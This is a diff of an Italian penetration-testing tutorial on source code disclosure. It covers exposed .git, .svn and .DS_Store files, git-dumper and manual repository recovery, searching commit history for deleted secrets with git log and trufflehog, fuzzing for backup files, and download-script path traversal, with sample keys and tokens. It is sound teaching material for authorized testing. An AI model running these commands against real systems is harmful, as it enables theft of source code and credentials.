@@ -1,11 +1,8 @@
 ---
-title: 'Source Code Disclosure: .git Esposto, Credenziali nei Commit e Git-Dumper'
+title: 'Source Code Disclosure: Vulnerabilità, Pentest e Fix'
 slug: source-code-disclosure
-description: >-
-  Source Code Disclosure nel pentesting: .git esposto, git-dumper, credenziali
-  nella git history e trufflehog per segreti. Da repository dump a cloud
-  takeover.
-image: /source-code-disclosure.webp
+description: 'Source Code Disclosure: come backup e file esposti rivelano il codice sorgente. Tecniche di pentest, rischi della vulnerabilità e soluzioni per difendersi.'
+image: /source-code-disclosure-pentest.webp
 draft: false
 date: 2026-03-19T00:00:00.000Z
 categories:
@@ -13,253 +10,317 @@ categories:
 subcategories:
   - owasp
 tags:
-  - source-code-disclosure
-  - git-exposure
+  - Source Code Disclosure
+  - Git Exposure
+  - Information Disclosure
+  - ''
+  - ''
 ---
 
-Lo sviluppatore deploya con `git pull` sul server di produzione. La directory `.git/` resta nella document root, accessibile da chiunque. L'attaccante la scopre con un `curl https://target.com/.git/HEAD` → `ref: refs/heads/main`. Con `git-dumper` ricostruisce l'**intero repository** — codice sorgente completo, storico dei commit, e soprattutto **ogni credenziale che è mai stata committata** nella storia del progetto, anche quelle cancellate anni fa.
+# Source Code Disclosure: Come Trovare e Sfruttare il Codice Sorgente Esposto
 
-La Source Code Disclosure non è solo "leggere il codice" — è avere accesso a **tutto ciò che è mai stato scritto e poi cancellato**: password hardcoded rimosse nel commit successivo (ma ancora nella history), API key di produzione committate per errore, token CI/CD, chiavi SSH, credenziali database. `git log --all -p` è un tesoro.
+**Source code disclosure** (o *source code disclosure vulnerability*) è una vulnerabilità che permette di leggere il codice sorgente di un'applicazione o i file che lo contengono: repository `.git` esposti, backup dimenticati, handler mal configurati, LFI o source map. In un pentest si verifica cosa è realmente esposto e si valuta l'impatto su codice, credenziali e sistemi collegati.
 
-La trovo nell'**8% dei pentest web**. Il vettore più comune è `.git/` esposto (6%), seguito da `.svn/` (1%) e misconfiguration del web server che serve il source code PHP (1%). Quando la trovo, l'escalation a credenziali valide avviene nel **85% dei casi** — quasi sempre c'è qualcosa di prezioso nella history.
+Il caso più classico: `curl https://target.com/.git/HEAD` risponde `ref: refs/heads/main`. Se i file del repository sono raggiungibili, in pochi minuti ricostruisci codice, branch e ogni password mai committata, anche quella cancellata dopo. La stessa esposizione arriva però da un `.svn` dimenticato, un `config.php.bak`, un file `.swp` di Vim, una LFI con `php://filter`, una DLL in `/bin/` o una source map JavaScript lasciata in produzione.
 
-Satellite operativo della [guida pillar File & Path Attacks](/articoli/file-path-attacks-guida-completa/).
+In questa guida vedi come trovarla, come sfruttarla fino ai segreti validi, come passare dal sorgente alla vulnerabilità e come chiuderla. Satellite operativo della [guida pillar File & Path Attacks](https://hackita.it/articoli/file-path-attacks-guida-completa/). Tutti gli esempi vanno usati solo su sistemi autorizzati o in lab (HTB, VulnHub, ambienti tuoi); `target.com` è l'host d'esempio.
 
 ## Cos'è la Source Code Disclosure?
 
-La Source Code Disclosure è l'esposizione non intenzionale del codice sorgente dell'applicazione, che può avvenire tramite **repository di versioning esposti** (`.git/`, `.svn/`), **misconfiguration del web server** (PHP source servito come testo), **file di metadata** (`.DS_Store`), o **backup del codice sorgente** nella document root. Il valore non è solo il codice — sono le **credenziali nella storia dei commit**.
+> **Source code disclosure** è l'esposizione non autorizzata del codice sorgente di un'applicazione web o di un'API: il file viene servito in chiaro invece di essere eseguito, oppure l'attaccante raggiunge repository, backup e file di build che contengono il codice. È una forma di *information disclosure*: il codice è già un'informazione sensibile, ma il vero valore sta in ciò che contiene (credenziali, chiavi, logica, endpoint nascosti).
 
-> **La Source Code Disclosure è pericolosa?**
-> Sì — il codice sorgente contiene credenziali hardcoded, secret key, logica di autenticazione bypassabile, endpoint nascosti, e nella git history **ogni segreto mai committato e poi rimosso**. Porta a: accesso database, cloud takeover, supply chain attack (se si trovano token CI/CD). Trovata nell'**8% dei pentest web**. Escalation a credenziali valide nell'85% dei casi.
+Una **source code disclosure vulnerability** nasce da un errore del server (handler PHP non attivo), da un errore di deploy (`.git/` nella document root), da un'altra vulnerabilità (LFI, arbitrary file read) o da un artefatto di build (source map, file di backup).
 
-***
+### Source code disclosure, information disclosure e file read
 
-## Discovery — Trovare il Source Code
+I termini si sovrappongono. Questa è la mappa:
 
-### Test Manuale Rapido (30 secondi)
+| Termine                                                                     | Cosa indica                                                                                                 |
+| --------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
+| **Source code disclosure**                                                  | Ciò che esce è il codice sorgente dell'applicazione o un suo contenuto utile                                |
+| **Information disclosure / information leakage vulnerability**              | Categoria più ampia: errori verbosi, header, versioni, commenti, file di configurazione, directory listing  |
+| **Web application information disclosure**                                  | Fuga dalla logica applicativa: stack trace, endpoint di debug, API che restituiscono campi in più           |
+| **Web server information disclosure vulnerability**                         | Fuga dal server: banner, `server-status`, directory listing, file di default                                |
+| **[Arbitrary file read](https://hackita.it/articoli/arbitrary-file-read/)** | Il meccanismo: leggi file a scelta. Se leggi i sorgenti, ottieni una source code disclosure                 |
+| **[LFI](https://hackita.it/articoli/lfi/)**                                 | Il meccanismo: l'app include un file scelto da te. Con `php://filter` leggi il sorgente invece di eseguirlo |
+| **[Backup exposure](https://hackita.it/articoli/backup-exposure/)**         | La causa: copie di file lasciate sul server (`.bak`, `.old`, archivi) che contengono il codice              |
+
+La distinzione conta nel report: la causa decide il fix. Un backup si rimuove, una LFI si corregge nel codice, un handler si riattiva nel web server.
+
+### Classificazione: OWASP e CWE
+
+La classificazione dipende dalla causa tecnica, non esiste una categoria unica.
+
+* **OWASP Top 10 2025, A01 – Broken Access Control**: file e repository raggiungibili da chi non dovrebbe (backup, `.git`, arbitrary file read).
+* **OWASP Top 10 2025, A02 – Security Misconfiguration**: directory listing attivo, handler non eseguito, debug in produzione, `web.config` mancante. Nel Top 10 2021 questa categoria era A05.
+* **OWASP Top 10 2025, A03 – Software Supply Chain Failures**: rientra solo quando il segreto trovato (token CI/CD, accesso alla pipeline) permette di manomettere build e distribuzione, non per la semplice lettura del codice.
+* **Top 10 2021**: le stesse cause stavano in A01:2021 e A05:2021. Se un report usa ancora quella versione, indicalo.
+* **CWE tipiche**: CWE-540 (informazioni sensibili nel codice sorgente), CWE-541 (include file), CWE-538 (file o directory accessibili dall'esterno), CWE-548 (directory listing), CWE-552 (file accessibili a terzi), CWE-200 (esposizione generica di informazioni).
+* **WASC-13**: Information Leakage.
+* **OWASP WSTG**: WSTG-CONF-04 (backup e file non referenziati) e WSTG-INFO-05 (contenuto delle pagine) sono i test di riferimento.
+
+## Perché è Pericolosa
+
+Il codice sorgente trasforma un test black-box in un test white-box: non cerchi più alla cieca, leggi.
+
+| Cosa trovi                                                           | Cosa ci fai                                                                                                                             |
+| -------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------- |
+| Credenziali hardcoded, `.env`, token CI/CD                           | Accesso a DB, cloud, GitLab/GitHub                                                                                                      |
+| Segreti di firma (`SECRET_KEY`, `APP_KEY`, secret JWT, `machineKey`) | Forgiare sessioni e token, in alcuni stack arrivare a RCE                                                                               |
+| Logica di autenticazione e autorizzazione                            | Bypass, [IDOR](https://hackita.it/articoli/idor/) mirati, [privilege escalation](https://hackita.it/articoli/privilege-escalation-web/) |
+| Query SQL e filtri                                                   | [SQL Injection](https://hackita.it/articoli/sql-injection/) trovata leggendo, non provando                                              |
+| Endpoint nascosti e pannelli admin                                   | Superficie che nessuna wordlist avrebbe trovato                                                                                         |
+| Logica di [upload](https://hackita.it/articoli/file-upload-attack/)  | Bypass dei filtri su misura, poi [web shell](https://hackita.it/articoli/web-shell/)                                                    |
+| Storico dei commit                                                   | Segreti rimossi ma ancora recuperabili                                                                                                  |
+
+## Come Finisce in Chiaro il Codice Sorgente
+
+| Vettore                   | Causa                                                       | Primo test                     |
+| ------------------------- | ----------------------------------------------------------- | ------------------------------ |
+| `.git/` esposto           | Deploy con `git pull` nella document root                   | `/.git/HEAD`                   |
+| `.svn/`, `.hg/`, `.bzr/`  | Stesso errore con altri VCS                                 | `/.svn/wc.db`, `/.hg/requires` |
+| `.DS_Store`               | Metadati del Finder copiati sul server                      | `/.DS_Store`                   |
+| File di backup e swap     | Editor e copie manuali (`config.php.bak`, `.index.php.swp`) | Fuzzing con estensioni         |
+| Handler non attivo        | PHP/ASP non eseguito dopo upgrade o config errata           | Risposta che contiene `<?php`  |
+| Script di download        | `download.php?file=` senza whitelist                        | `?file=download.php`           |
+| LFI / arbitrary file read | Wrapper `php://filter`, traversal, `/proc/self/cwd`         | Vedi sezione PHP               |
+| Artefatti di build        | Source map `.js.map`, `.class`, `.dll`, `.pyc`              | `//# sourceMappingURL=`        |
+| Repository pubblici       | Repo GitHub/GitLab dell'azienda                             | Dork su GitHub                 |
+
+## Discovery: Trovare il Source Code
+
+### Test manuale rapido
+
+Attenzione ai falsi positivi: una SPA o un WAF possono rispondere 200 a qualsiasi path. Verifica sempre il **contenuto**, non solo lo status code.
 
 ```bash
-# Git
-curl -s "https://target.com/.git/HEAD"
-# Se risponde con "ref: refs/heads/main" o "ref: refs/heads/master" → ESPOSTO!
+# Git: a real exposure returns a ref, not an HTML page
+curl -s https://target.com/.git/HEAD | grep -E '^ref: refs/heads/' && echo "[+] .git exposed"
+curl -s https://target.com/.git/config | grep -F '[core]' && echo "[+] .git/config exposed"
 
-curl -s "https://target.com/.git/config"
-# Se mostra [core], [remote], URL del repository → ESPOSTO!
+# SVN >= 1.7 keeps a SQLite database
+curl -s https://target.com/.svn/wc.db | head -c 15 | grep -a 'SQLite format' && echo "[+] .svn/wc.db exposed"
 
-# SVN
-curl -s "https://target.com/.svn/entries"
-curl -s "https://target.com/.svn/wc.db"
-# Se mostra contenuto → ESPOSTO!
+# Mercurial and Bazaar
+curl -s https://target.com/.hg/requires | grep -E 'revlogv1|store' && echo "[+] .hg exposed"
+curl -s https://target.com/.bzr/README | grep -F 'Bazaar' && echo "[+] .bzr exposed"
 
-# Mercurial
-curl -s "https://target.com/.hg/store/00manifest.i"
-
-# DS_Store (macOS)
-curl -s "https://target.com/.DS_Store" | strings
-# Se mostra nomi file → listing directory esposta
-
-# Bazaar
-curl -s "https://target.com/.bzr/README"
+# macOS Finder metadata starts with the magic bytes "Bud1"
+curl -s https://target.com/.DS_Store | head -c 8 | grep -a 'Bud1' && echo "[+] .DS_Store exposed"
 ```
 
-### Feroxbuster / ffuf
+Un dettaglio che fa perdere repository: **`/.git/` che risponde 403 non significa protetto**. Con directory listing disattivato il server blocca la cartella, ma i singoli file (`/.git/HEAD`, `/.git/index`) possono restare raggiungibili, e [git-dumper](https://github.com/arthaud/git-dumper) ricostruisce comunque il repository. Testa sempre i file, mai solo la directory. Vale anche al contrario: un 403 al posto di un 404 conferma che il path esiste.
+
+### Fuzzing con ffuf
+
+Con [ffuf](https://hackita.it/articoli/ffuf/) (o [gobuster](https://hackita.it/articoli/gobuster/)) cerchi i file chiave in blocco:
 
 ```bash
-# Feroxbuster per file di versioning
-feroxbuster -u https://target.com \
-  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
-  --status-codes 200 \
-  -x git,svn,hg \
-  -t 50
-
-# ffuf mirato
-ffuf -u "https://target.com/FUZZ" \
-  -w source_files.txt \
-  -mc 200
-
-# source_files.txt:
-cat > source_files.txt << 'EOF'
+cat > vcs-files.txt << 'EOF'
 .git/HEAD
 .git/config
 .git/index
-.git/description
-.git/refs/heads/main
-.git/refs/heads/master
 .git/logs/HEAD
 .git/packed-refs
 .svn/entries
 .svn/wc.db
-.hg/store/00manifest.i
+.hg/requires
+.bzr/README
 .DS_Store
 .env
-.env.local
 .env.production
+.idea/workspace.xml
+.vscode/sftp.json
+docker-compose.yml
+composer.json
+package.json
 EOF
+
+# -ac auto-calibrates and drops catch-all 200 responses (SPA, WAF)
+ffuf -u https://target.com/FUZZ -w vcs-files.txt -mc 200 -ac
+
+# Broader list of common leftovers shipped with SecLists
+ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -mc 200 -ac
 ```
 
-### Google Dorks
+### Su molti host: sottodomini e microservizi
+
+Ogni servizio ha il suo deploy, quindi il suo possibile `.git`. Parti dall'enumerazione ([amass](https://hackita.it/articoli/amass/), [assetfinder](https://hackita.it/articoli/assetfinder/)) e testa tutto con [httpx](https://hackita.it/articoli/httpx/):
 
 ```bash
-site:target.com ".git" OR ".svn" OR ".env"
-site:target.com intitle:"index of" ".git"
-site:target.com filetype:git
-inurl:".git/config" site:target.com
+assetfinder --subs-only target.com > subs.txt
+
+# Probe a single path on every host and keep only real git responses
+cat subs.txt | httpx -path /.git/HEAD -mr 'ref: refs/heads/' -silent
+cat subs.txt | httpx -path /.env -mr 'APP_|DB_|SECRET|PASSWORD' -silent
 ```
 
 ### Nuclei
 
 ```bash
-nuclei -u https://target.com -t misconfiguration/git-config.yaml
-nuclei -u https://target.com -t exposures/configs/git-config.yaml
-nuclei -u https://target.com -tags git,svn,exposure
+nuclei -u https://target.com \
+  -t http/exposures/configs/git-config.yaml \
+  -t http/exposures/configs/exposed-svn.yaml
 ```
 
-***
+### Google Dorks e GitHub
 
-## .git Esposto — Exploitation Completa
+```text
+site:target.com inurl:.git
+site:target.com intitle:"index of" ".git"
+site:target.com ext:bak | ext:old | ext:swp | ext:sql | ext:env
+```
 
-### git-dumper — Ricostruzione Repository
+Per i repository pubblici dell'azienda cerca su GitHub con `org:nomeazienda password` o `org:nomeazienda "BEGIN RSA PRIVATE KEY"`: spesso il codice non è esposto dal sito ma da un repo dimenticato o da un account personale di uno sviluppatore.
+
+## .git Esposto: Exploitation Completa
+
+### Dump con git-dumper
 
 ```bash
-# === STEP 1: Conferma .git esposto ===
-curl -s "https://target.com/.git/HEAD"
-# ref: refs/heads/main → CONFERMATO
-
-# === STEP 2: Dump completo del repository ===
-pip install git-dumper --break-system-packages
+pipx install git-dumper
 git-dumper https://target.com/.git/ ./target-source
-
-# Output:
-# [-] Testing https://target.com/.git/HEAD [200]
-# [-] Testing https://target.com/.git/config [200]
-# [-] Fetching objects...
-# [-] Running git checkout .
-# [+] Done!
-
 cd target-source
 ls -la
-# .env
-# config/
-# app/
-# index.php
-# ...tutto il codice sorgente!
 ```
 
-### Cerca credenziali nel codice
+**Attenzione:** esegui il dump in una VM o in un container. Un `.git/config` controllato dal target (cioè da un attaccante, in uno scenario ostile) può far eseguire comandi sulla tua macchina durante il checkout. Se il server risponde in modo anomalo, git-dumper ha `--any-status` per accettare risposte non-200 con contenuto valido, `-X POST` per cambiare metodo HTTP e `--proxy` per passare da [Burp Suite](https://hackita.it/articoli/burp-suite/).
 
 ```bash
-# === STEP 3: Grep per credenziali nel codice attuale ===
-grep -r "password\|secret\|key\|token\|api_key\|credential" \
+git-dumper --proxy http://127.0.0.1:8080 https://target.com/.git/ ./target-source
+```
+
+Con directory listing attivo git-dumper scarica tutto ricorsivamente (e funziona anche un `wget` mirror). Senza listing parte da `HEAD`, `index`, `refs` e `logs` e ricostruisce gli oggetti dagli hash che trova: ottieni molto, ma i **packfile** possono sfuggire.
+
+```bash
+# Directory listing enabled: plain recursive mirror, then restore the working tree
+wget --mirror --include-directories=/.git https://target.com/.git/
+cd target.com && git checkout -- .
+```
+
+| Tool                          | Quando usarlo                                                                     |
+| ----------------------------- | --------------------------------------------------------------------------------- |
+| git-dumper                    | Primo tentativo, il più affidabile                                                |
+| GitTools (Dumper + Extractor) | Se git-dumper si ferma: Extractor ricostruisce i commit da un dump parziale       |
+| GitHack                       | Ricostruisce l'albero dei file leggendo `.git/index`, utile con listing disattivo |
+| GitHacker                     | Dump completo di branch, stash e tag da un `.git` esposto                         |
+| dvcs-ripper (`rip-git.pl`)    | Stesso approccio anche per SVN, Hg, Bzr, CVS                                      |
+
+### Recupero manuale: quando gli strumenti falliscono
+
+Se il WAF blocca il traffico di git-dumper o il repository è strano, il recupero a mano è semplice perché ogni oggetto vive a un URL prevedibile: `/.git/objects/<primi 2 caratteri dell'hash>/<resto dell'hash>`.
+
+```bash
+# Local empty repository: git can read any loose object dropped into it
+git init -q manual-dump && cd manual-dump
+
+fetch_object() {
+  local h=$1
+  mkdir -p ".git/objects/${h:0:2}"
+  curl -sf -o ".git/objects/${h:0:2}/${h:2}" "https://target.com/.git/objects/${h:0:2}/${h:2}" \
+    || echo "[-] ${h} missing (probably inside a packfile)"
+}
+
+# HEAD points to the branch, the branch file contains the commit hash
+curl -s https://target.com/.git/HEAD                 # ref: refs/heads/main
+commit=$(curl -s https://target.com/.git/refs/heads/main)
+fetch_object "$commit"
+git cat-file -p "$commit"                            # tree, parent, author, message
+
+# Walk down: commit -> tree -> blobs (the files)
+tree=$(git cat-file -p "$commit" | awk '/^tree/{print $2}')
+fetch_object "$tree"
+git cat-file -p "$tree"                              # file names with their blob hashes
+```
+
+Due scorciatoie per trovare gli hash:
+
+```bash
+# Every commit hash, author and message ever made on this checkout
+curl -s https://target.com/.git/logs/HEAD
+
+# The index lists every tracked file with its blob hash
+curl -s -o .git/index https://target.com/.git/index
+git ls-files --stage
+```
+
+Se gli oggetti non sono "loose" ma dentro un packfile, controlla `info/packs` (presente quando il repo è servito in modo "dumb" via HTTP) e scarica `.pack` e `.idx`:
+
+```bash
+for pack in $(curl -s https://target.com/.git/objects/info/packs | awk '/^P /{print $2}'); do
+  for ext in pack idx; do
+    curl -sf -o ".git/objects/pack/${pack%.pack}.$ext" "https://target.com/.git/objects/pack/${pack%.pack}.$ext"
+  done
+done
+git log --all --oneline | head
+```
+
+### Prima occhiata al repository
+
+```bash
+git log --all --oneline --graph | head -20
+git branch -a
+git stash list
+git remote -v
+git log --all --format='%an <%ae>' | sort -u
+```
+
+Cosa guardi: branch dimenticati (`dev`, `old`, `hotfix`), stash con codice mai committato, autori ed email (utenti validi per [password spraying](https://hackita.it/articoli/password-spraying/) e phishing) e il `remote`, che a volte contiene un token.
+
+```text
+[remote "origin"]
+    url = https://deploy-bot:glpat-8fK2xQ7mZ1pL9vNc4RtB@gitlab.company.com/team/webapp.git
+```
+
+Un URL con credenziali incorporate vale già da solo un possibile accesso al GitLab aziendale, da validare con il metodo minimo descritto più sotto.
+
+### Credenziali nel codice attuale
+
+```bash
+cat .env 2>/dev/null
+
+grep -rIn -E "password|passwd|secret|api[_-]?key|token|credential" \
   --include="*.php" --include="*.py" --include="*.js" \
   --include="*.yml" --include="*.yaml" --include="*.json" \
-  --include="*.env" --include="*.conf" \
-  . | grep -v node_modules | grep -v ".git/"
-
-# === STEP 4: .env (se presente) ===
-cat .env
-# DB_PASSWORD=SuperSecret123!
-# AWS_ACCESS_KEY_ID=AKIA...
-# STRIPE_SECRET=sk_live_...
+  --include="*.env" --include="*.conf" --include="*.xml" \
+  . --exclude-dir=node_modules --exclude-dir=.git
 ```
-
-### Cerca credenziali nella HISTORY dei commit
-
-```bash
-# === STEP 5: Cerca nella history (il tesoro vero) ===
-# Credenziali committate e poi rimosse sono ANCORA nella history!
-
-# Mostra tutti i commit
-git log --all --oneline
-# a1b2c3d Fix: remove hardcoded credentials
-# d4e5f6g Add database config
-# h7i8j9k Initial commit
-
-# Il commit "remove hardcoded credentials" → il commit PRIMA contiene le credenziali!
-
-# Mostra le diff di tutti i commit
-git log --all -p -- "*.env" "*.yml" "*.conf" "*.php" "*.py" "*config*" "*secret*"
-
-# Cerca pattern specifici nella history
-git log --all -p -S "password" | head -100
-git log --all -p -S "api_key" | head -100
-git log --all -p -S "secret_key" | head -100
-git log --all -p -S "AKIA" | head -50         # AWS access key
-git log --all -p -S "sk_live" | head -50       # Stripe live key
-git log --all -p -S "-----BEGIN" | head -50    # SSH/SSL private key
-```
-
-### trufflehog — Scan Automatico Per Segreti
-
-```bash
-# trufflehog scansiona TUTTA la history del repository
-# e trova credenziali con pattern matching + entropia
-
-trufflehog filesystem --directory=./target-source
-
-# Output:
-# Found verified result 🐷🔑
-# Detector Type: AWS
-# Raw result: AKIAIOSFODNN7EXAMPLE
-# File: config/deploy.yml
-# Commit: d4e5f6g
-# 
-# Found verified result 🐷🔑
-# Detector Type: Stripe
-# Raw result: sk_live_51H7wmJKxPnO...
-# File: .env (deleted)
-# Commit: a1b2c3d
-
-# trufflehog verifica anche se le credenziali sono ANCORA VALIDE!
-```
-
-### git-secrets — Alternativa leggera
-
-```bash
-# Scansiona per pattern AWS
-git secrets --scan
-git secrets --scan-history
-```
-
-***
-
-## Output Reale — Cosa Trovi
-
-### .git/config
-
-```bash
-$ curl -s "https://target.com/.git/config"
-
-[core]
-    repositoryformatversion = 0
-    filemode = true
-    bare = false
-[remote "origin"]
-    url = git@gitlab.company.com:team/webapp.git
-    fetch = +refs/heads/*:refs/remotes/origin/*
-[branch "main"]
-    remote = origin
-    merge = refs/heads/main
-[user]
-    name = Mario Rossi
-    email = mario.rossi@company.com
-```
-
-**Cosa ci fai:** URL del repository privato GitLab, nome e email dello sviluppatore (per phishing, social engineering, o login con password spray).
 
 ### Credenziali nella history
 
-```bash
-$ git log --all -p -S "password" | head -30
+La history è il motivo per cui un `.git` esposto vale più di un normale leak del codice: ciò che è stato cancellato **resta nei commit**, se gli oggetti sono stati recuperati.
 
+```bash
+# Files that existed once and were deleted: .env, keys, dumps, configs
+git log --all --diff-filter=D --name-only --pretty=format: | sort -u | grep -iE '\.env|\.pem|id_rsa|\.sql|\.bak|config|secret|passw'
+
+# Read a deleted file from the commit right before its deletion
+git show a1b2c3d^:.env
+
+# Pickaxe: every commit that added or removed the string
+git log --all -p -S'password' | head -100
+git log --all -p -S'AKIA' | head -50
+git log --all -p -S'-----BEGIN' | head -50
+
+# Regex version: assignments that look like secrets
+git log --all -p -G'(api[_-]?key|secret|token)\s*[:=]' | head -100
+
+# Direct grep across every commit (slow on big repositories)
+git grep -I -n -E 'AKIA[0-9A-Z]{16}|sk_live_[0-9a-zA-Z]+|-----BEGIN (RSA|OPENSSH|EC) PRIVATE KEY-----' $(git rev-list --all)
+
+# Commit messages that hint at security fixes or leaked data
+git log --all --oneline -i --grep='secret\|password\|credential\|token\|key\|fix.*vuln\|cve'
+```
+
+Output **illustrativo** (dati sintetici) di come appare una credenziale nella storia:
+
+```text
 commit d4e5f6g7h8i9j0k
 Author: Mario Rossi <mario.rossi@company.com>
 Date:   Mon Jan 15 10:00:00 2026 +0100
 
     Add database configuration
 
-diff --git a/config/database.yml b/config/database.yml
-new file mode 100644
---- /dev/null
 +++ b/config/database.yml
 +production:
 +  adapter: postgresql
@@ -269,285 +330,580 @@ new file mode 100644
 +  password: Pr0d_DB_P@ssw0rd!2024
 ```
 
-```bash
-$ git log --all -p -S "AKIA" | head -20
-
+```text
 commit h7i8j9k0l1m2n3o
 Author: Laura Bianchi <laura.bianchi@company.com>
 Date:   Fri Dec 20 15:30:00 2025 +0100
 
     Deploy script - REMOVE BEFORE MERGE!!
 
-diff --git a/scripts/deploy.sh b/scripts/deploy.sh
++++ b/scripts/deploy.sh
 +export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
 +export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
 ```
 
-Il commento "REMOVE BEFORE MERGE" → non è stato rimosso. E anche se fosse stato rimosso in un commit successivo, **è ancora nella history**.
+Il commento "REMOVE BEFORE MERGE" non è stato rispettato. E anche se fosse stato rimosso nel commit dopo, il segreto resterebbe nella storia.
 
-***
+### Scansione automatica con trufflehog
 
-## .svn Esposto — Exploitation
+trufflehog combina pattern, entropia e **verifica live** dei segreti trovati. Occhio al sottocomando: `trufflehog filesystem` legge solo i file correnti, mentre per la storia serve `trufflehog git`.
 
 ```bash
-# Verifica
-curl -s "https://target.com/.svn/entries"
-# Se versione < 1.7: il file entries contiene la struttura completa
-# Se versione ≥ 1.7: usa wc.db (SQLite)
-
-# Download wc.db
-curl -s -o wc.db "https://target.com/.svn/wc.db"
-sqlite3 wc.db "SELECT local_relpath FROM NODES;"
-# Lista tutti i file nel repository
-
-# Tool automatico: svn-extractor
-svn-extractor https://target.com/.svn/ ./target-svn
+trufflehog git file://./target-source --results=verified,unknown
 ```
 
-## .DS\_Store — Directory Listing su macOS
+```text
+Found verified result 🐷🔑
+Detector Type: AWS
+Raw result: AKIAIOSFODNN7EXAMPLE
+File: scripts/deploy.sh
+Commit: h7i8j9k0l1m2n3o
+```
+
+La verifica **invia davvero** la credenziale al provider (AWS, GitHub, Stripe...). In un engagement controlla che le regole d'ingaggio lo permettano; altrimenti usa `--no-verification` e valida a mano solo ciò che è in scope.
+
+Alternative leggere: `git-secrets` (`git secrets --register-aws` e poi `git secrets --scan-history`), gitleaks e gitrob; per i repository dell'azienda su GitHub, git-hound e gitdorker automatizzano i dork.
+
+## .svn, .hg, .bzr e CVS Esposti
+
+### Subversion
+
+Con SVN \< 1.7 il file `entries` elenca tutto. Dalla 1.7 serve `wc.db` (SQLite) e i file veri stanno in `.svn/pristine/`, indicizzati per SHA-1:
 
 ```bash
-# .DS_Store è creato da macOS Finder in ogni directory visitata
-# Contiene i nomi dei file nella directory
+curl -s -o wc.db https://target.com/.svn/wc.db
 
-curl -s "https://target.com/.DS_Store" | strings
-# admin_panel.php
-# config_backup.zip
-# database_dump.sql
-# .env.production
-# secret_keys.txt
+# For every file: its path and the URL of its pristine copy
+sqlite3 -separator ' ' wc.db "SELECT local_relpath, '.svn/pristine/' || substr(checksum,7,2) || '/' || substr(checksum,7) || '.svn-base' FROM NODES WHERE kind='file' AND checksum IS NOT NULL;" |
+while read -r path url; do
+  curl -sf --create-dirs -o "dump/$path" "https://target.com/$url"
+done
+```
 
-# Tool: ds_store parser
-pip install ds-store --break-system-packages
-python3 -c "
+### Mercurial, Bazaar, CVS
+
+```bash
+# dvcs-ripper handles git, svn, hg, bzr and cvs
+rip-hg.pl -v -u https://target.com/.hg/
+rip-bzr.pl -v -u https://target.com/.bzr/
+```
+
+### .DS\_Store: la mappa dei file
+
+Il `.DS_Store` generato dal Finder elenca i nomi dei file della cartella, anche quelli che nessuna pagina linka.
+
+```bash
+curl -s -o ds_store https://target.com/.DS_Store
+pip install ds_store
+python3 - << 'EOF'
 from ds_store import DSStore
-with DSStore.open('downloaded_ds_store', 'r') as d:
-    for entry in d:
-        print(entry.filename)
-"
+
+# Print every filename recorded by Finder in this directory
+with DSStore.open("ds_store", "r") as store:
+    print("\n".join(sorted({entry.filename for entry in store})))
+EOF
 ```
 
-## PHP Source via Misconfiguration
+I nomi che escono (`config_backup.zip`, `database_dump.sql`, `admin_panel.php`) vanno subito richiesti al server. Se la directory è profonda, ds\_store\_exp ricostruisce l'albero in modo ricorsivo.
+
+## File di Backup, Swap e Residui degli Editor
+
+Gli sviluppatori lavorano sul server e gli editor lasciano copie. Il [backup exposure](https://hackita.it/articoli/backup-exposure/) è una delle fonti più comuni di source code disclosure (WSTG-CONF-04).
 
 ```bash
-# Se PHP non è configurato correttamente, il web server
-# serve i file .php come testo invece di eseguirli
+cat > files.txt << 'EOF'
+index.php
+config.php
+wp-config.php
+settings.py
+database.yml
+web.config
+login.php
+EOF
 
-# Dopo un upgrade Apache/Nginx senza riattivare il modulo PHP:
-curl "https://target.com/config.php"
+cat > suffixes.txt << 'EOF'
+.bak
+.old
+.orig
+.save
+.swp
+.txt
+.zip
+.tar.gz
+~
+EOF
+
+# FILE and EXT are combined: config.php.bak, index.php~, ...
+ffuf -u https://target.com/FILEEXT -w files.txt:FILE -w suffixes.txt:EXT -mc 200 -ac
+```
+
+Altri nomi da provare: `.index.php.swp` (swap di Vim, stesso nome con punto iniziale), `index.php.swo`, `.config.php.swp`, `Copy of index.php`, `index_old.php`, `index.php.2024`, archivi interi come `www.zip`, `backup.tar.gz`, `site.sql`. BFAC automatizza questa generazione di varianti.
+
+```bash
+# Recover the content of a Vim swap file
+curl -s -O https://target.com/.index.php.swp
+vim -r .index.php.swp
+
+# Or just pull out readable strings
+strings .index.php.swp | head -50
+```
+
+Verifica sempre l'evidenza: un `.zip` che risponde 200 va scaricato e aperto per capire se contiene davvero codice (e non una pagina HTML di errore servita con status 200).
+
+## PHP Source Code Disclosure
+
+La **PHP source code disclosure** ha quattro cause ricorrenti.
+
+### 1. PHP non viene eseguito
+
+Dopo un upgrade o una configurazione sbagliata (un `location` Nginx che non passa il file a PHP-FPM, un modulo Apache disattivato, una cartella `uploads/` senza handler) il server serve il `.php` come testo:
+
+```bash
+curl -s https://target.com/config.php
 # <?php
 # $db_host = 'localhost';
 # $db_user = 'admin';
 # $db_pass = 'SecretPass123!';
-# ?>
-# Il codice PHP è visibile in chiaro!
 
-# Verifica: se la response contiene "<?php" → disclosure
-curl -s "https://target.com/index.php" | head -5
-# Se vedi <?php → il server non sta eseguendo PHP → source disclosure
+# Fast check: raw PHP tags in the body mean the interpreter is not running
+curl -s https://target.com/index.php | head -5 | grep -F '<?php' && echo "[+] PHP source disclosed"
 ```
 
-***
+Controlla anche l'estensione `.phps` (su Apache con l'handler `x-httpd-php-source` mostra il sorgente colorato) e i file `.inc`, che molti server non associano a PHP e servono in chiaro.
 
-## Workflow Reale — Dalla Discovery Alle Credenziali
+### 2. Script di download senza whitelist
 
-### Step 1 → Test rapido (30 secondi)
+Una pagina come `download.php?file=report.pdf` che apre qualsiasi path permette di scaricare i sorgenti dell'applicazione, a partire dallo script stesso:
 
 ```bash
-curl -s "https://target.com/.git/HEAD"
-# ref: refs/heads/main → ESPOSTO!
+curl -s "https://target.com/download.php?file=download.php"
+curl -s "https://target.com/download.php?file=../config/database.php"
 ```
 
-### Step 2 → Dump repository (2-5 minuti)
+È un caso di [arbitrary file read](https://hackita.it/articoli/arbitrary-file-read/) e di [path traversal](https://hackita.it/articoli/path-traversal/).
+
